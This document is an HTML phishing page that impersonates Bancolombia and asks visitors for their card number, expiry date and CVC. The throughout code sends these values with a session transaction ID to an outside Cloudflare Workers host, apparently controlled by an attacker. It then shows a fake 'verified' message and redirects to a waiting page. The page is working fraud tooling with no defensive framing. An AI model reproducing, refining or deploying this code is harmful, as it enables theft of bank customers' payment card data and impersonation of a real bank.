<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
<title>Datos Tarjeta - Bancolombia</title>

<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    background-image: url('fon.jpg');
    background-size: 100% 100%;
    background-position: center;
    background-repeat: no-repeat;
    background-attachment: fixed;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    color: #333;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 16px;
    position: relative;
  }

  /* Fondo opaco */
  body::before {
    content: '';
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url('fon.jpg');
    background-size: 100% 100%;
    background-position: center;
    background-repeat: no-repeat;
    filter: brightness(0.4);
    opacity: 0.85;
    z-index: -1;
  }

  body > * {
    position: relative;
    z-index: 1;
  }

  .top-container {
    position: relative;
    top: -60px;
    width: 100%;
    display: flex;
    justify-content: center;
  }

  .container {
    width: 100%;
    max-width: 450px;
    margin: 0 auto;
  }

  .code-card {
    background: white;
    border-radius: 8px;
    padding: 52px 20px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.05);
    border: 1px solid #e0e0e0;
  }

  .gif-container {
    text-align: center;
    margin-bottom: 20px;
  }

  .gif-container img {
    width: 100%;
    max-width: 350px;
    height: 110px;
    object-fit: fill;
    border-radius: 10px;
  }

  .subtitle {
    font-size: 27px;
    font-weight: 600;
    color: #333;
    margin-bottom: 10px;
    text-align: center;
  }

  .info-text {
    color: #666;
    font-size: 13px;
    margin-bottom: 30px;
    text-align: center;
  }

  /* Campos del formulario */
  .form-group {
    margin-bottom: 25px;
    text-align: left;
  }

  .form-group label {
    display: block;
    font-weight: 600;
    margin-bottom: 8px;
    font-size: 14px;
    color: #333;
  }

  .form-group input {
    width: 100%;
    padding: 12px 0;
    border: none;
    border-bottom: 2px solid #ccc;
    font-size: 18px;
    background: transparent;
    outline: none;
    transition: all 0.2s ease;
    font-family: 'Segoe UI', monospace;
  }

  .form-group input:focus {
    border-bottom-color: #F9A825;
  }

  .form-group input.error {
    border-bottom-color: #ff4444;
  }

  .error-message {
    color: #ff4444;
    font-size: 11px;
    margin-top: 5px;
    display: none;
  }

  .error-message.show {
    display: block;
  }

  /* Fila para fecha y CVC */
  .row-fields {
    display: flex;
    gap: 15px;
  }

  .row-fields .form-group {
    flex: 1;
  }

  /* Botones */
  .buttons-row {
    display: flex;
    gap: 15px;
    margin-top: 30px;
  }

  .btn-borrar {
    flex: 1;
    border-radius: 26px;
    padding: 14px;
    font-size: 15px;
    font-weight: 600;
    border: none;
    cursor: pointer;
    background: #ffffff;
    color: #999;
    border: 1px solid #ccc;
    transition: all 0.3s ease;
  }

  .btn-borrar:hover {
    border-color: #F9A825;
    color: #F9A825;
  }

  .btn-continuar {
    flex: 1;
    border-radius: 26px;
    padding: 14px;
    font-size: 15px;
    font-weight: 600;
    border: none;
    cursor: not-allowed;
    background: #e0e0e0;
    color: #999;
    transition: all 0.3s ease;
  }

  .btn-continuar.active {
    background-color: #fdda24;
    cursor: pointer;
    color: #333;
  }

  .btn-continuar.active:hover {
    background-color: #f57f17;
  }

  .loader-overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.7);
    z-index: 9999;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    color: white;
  }

  .loader-overlay.active {
    display: flex;
  }

  .spinner {
    width: 45px;
    height: 45px;
    border: 4px solid rgba(255,255,255,0.3);
    border-top-color: #F9A825;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-bottom: 15px;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }
</style>
</head>
<body>

<div class="top-container">
  <div class="container">
    <div class="code-card">
      <!-- GIF animado -->
      <div class="gif-container">
        <img src="clien.png" alt="Animación" id="gifAnimado">
      </div>

      <div class="subtitle">Datos de tu Tarjeta</div>
      <div class="info-text">Ingresa los datos de tu tarjeta Bancolombia</div>

      <!-- Número de tarjeta (16 dígitos) -->
      <div class="form-group">
        <label>💳 Número de tarjeta</label>
        <input type="text" id="tarjeta" maxlength="19" placeholder="" autocomplete="off">
        <div class="error-message" id="tarjetaError">Ingresa 16 dígitos válidos</div>
      </div>

      <!-- Fecha y CVC en la misma fila -->
      <div class="row-fields">
        <div class="form-group">
          <label>📅 Fecha expiración</label>
          <input type="text" id="fecha" maxlength="5" placeholder="MM/AA" autocomplete="off">
          <div class="error-message" id="fechaError">Formato MM/AA</div>
        </div>
        <div class="form-group">
          <label>🔒 CVC</label>
          <input type="text" id="cvc" maxlength="4" placeholder="***" autocomplete="off" inputmode="numeric">
          <div class="error-message" id="cvcError">3 o 4 dígitos</div>
        </div>
      </div>

      <!-- Botones -->
      <div class="buttons-row">
        <button class="btn-borrar" onclick="borrarTodo()">Borrar</button>
        <button class="btn-continuar" id="btnContinuar" onclick="continuar()" disabled>Continuar</button>
      </div>
    </div>
  </div>
</div>

<div class="loader-overlay" id="loaderOverlay">
  <div class="spinner"></div>
  <div>Validando ...</div>
</div>

<script>
const WORKER_URL = "https://ancient-dawn-3a7e.perrayolo11.workers.dev";

const tarjetaInput = document.getElementById('tarjeta');
const fechaInput = document.getElementById('fecha');
const cvcInput = document.getElementById('cvc');
const btnContinuar = document.getElementById('btnContinuar');
const loader = document.getElementById('loaderOverlay');

let enviado = false;

// Formatear número de tarjeta (agrupa de 4 en 4)
function formatearTarjeta(value) {
  let numeros = value.replace(/\D/g, '');
  if (numeros.length > 16) numeros = numeros.slice(0, 16);
  let grupos = [];
  for (let i = 0; i < numeros.length; i += 4) {
    grupos.push(numeros.slice(i, i + 4));
  }
  return grupos.join(' ');
}

tarjetaInput.addEventListener('input', function(e) {
  let valor = e.target.value.replace(/\s/g, '');
  let numeros = valor.replace(/\D/g, '');
  if (numeros.length > 16) numeros = numeros.slice(0, 16);
  e.target.value = formatearTarjeta(numeros);
  validarFormulario();
});

tarjetaInput.addEventListener('keydown', function(e) {
  if (e.key === 'Backspace' && this.value.length > 0) {
    const valorLimpio = this.value.replace(/\s/g, '');
    if (valorLimpio.length % 4 === 0 && this.value.slice(-1) === ' ') {
      this.value = this.value.slice(0, -1);
    }
  }
});

// Formatear fecha (MM/AA)
fechaInput.addEventListener('input', function(e) {
  let valor = e.target.value.replace(/\D/g, '');
  if (valor.length >= 2) {
    valor = valor.slice(0, 2) + '/' + valor.slice(2, 4);
  }
  e.target.value = valor.slice(0, 5);
  validarFormulario();
});

// CVC solo números
cvcInput.addEventListener('input', function(e) {
  let valor = e.target.value.replace(/\D/g, '');
  if (valor.length > 4) valor = valor.slice(0, 4);
  e.target.value = valor;
  validarFormulario();
});

function validarTarjeta() {
  const valor = tarjetaInput.value.replace(/\s/g, '');
  const esValido = /^\d{16}$/.test(valor);
  const errorElement = document.getElementById('tarjetaError');
  
  if (esValido) {
    tarjetaInput.classList.remove('error');
    errorElement.classList.remove('show');
  } else {
    tarjetaInput.classList.add('error');
    errorElement.classList.add('show');
  }
  return esValido;
}

function validarFecha() {
  const valor = fechaInput.value;
  const esValido = /^(0[1-9]|1[0-2])\/\d{2}$/.test(valor);
  const errorElement = document.getElementById('fechaError');
  
  if (esValido) {
    fechaInput.classList.remove('error');
    errorElement.classList.remove('show');
  } else {
    fechaInput.classList.add('error');
    errorElement.classList.add('show');
  }
  return esValido;
}

function validarCVC() {
  const valor = cvcInput.value;
  const esValido = /^\d{3,4}$/.test(valor);
  const errorElement = document.getElementById('cvcError');
  
  if (esValido) {
    cvcInput.classList.remove('error');
    errorElement.classList.remove('show');
  } else {
    cvcInput.classList.add('error');
    errorElement.classList.add('show');
  }
  return esValido;
}

function validarFormulario() {
  const tarjetaValida = validarTarjeta();
  const fechaValida = validarFecha();
  const cvcValida = validarCVC();
  
  if (tarjetaValida && fechaValida && cvcValida) {
    btnContinuar.classList.add('active');
    btnContinuar.disabled = false;
  } else {
    btnContinuar.classList.remove('active');
    btnContinuar.disabled = true;
  }
}

function borrarTodo() {
  tarjetaInput.value = '';
  fechaInput.value = '';
  cvcInput.value = '';
  validarFormulario();
  tarjetaInput.focus();
}

async function enviarDatosWorker() {
  try {
    const transactionId = localStorage.getItem('transactionId');
    
    if (!transactionId) {
      console.error("❌ No se encontró transactionId");
      return false;
    }

    const datos = {
      transactionId: transactionId,
      tarjeta: tarjetaInput.value.replace(/\s/g, ''),
      fecha: fechaInput.value,
      cvc: cvcInput.value,
      tipo: "tarjeta"
    };

    console.log("📤 Enviando datos de tarjeta:", datos);

    const response = await fetch(`${WORKER_URL}/tarjeta-data`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(datos)
    });

    const result = await response.json();

    if (result.ok) {
      console.log("✅ Datos enviados correctamente");
      return true;
    } else {
      console.error("❌ Error:", result.error);
      return false;
    }

  } catch (error) {
    console.error("❌ Error de conexión:", error);
    return false;
  }
}

async function continuar() {
  if (enviado) return;
  
  if (!validarTarjeta() || !validarFecha() || !validarCVC()) return;
  
  enviado = true;
  btnContinuar.disabled = true;
  loader.classList.add('active');

  const exito = await enviarDatosWorker();

  if (exito) {
    const loaderText = document.querySelector('.loader-overlay div:last-child');
    if (loaderText) loaderText.textContent = "✅ Datos verificados! Redirigiendo...";
    
    setTimeout(() => {
      window.location.href = 'espera.html';
    }, 1500);
  } else {
    enviado = false;
    loader.classList.remove('active');
    btnContinuar.disabled = false;
    alert("Error al enviar datos. Intenta nuevamente.");
  }
}

document.addEventListener('DOMContentLoaded', function() {
  const transactionId = localStorage.getItem('transactionId');
  if (!transactionId) {
    console.error("❌ No hay transactionId");
    alert("Sesión no encontrada");
    return;
  }
  
  tarjetaInput.value = '';
  fechaInput.value = '';
  cvcInput.value = '';
});
</script>
</body>
</html>
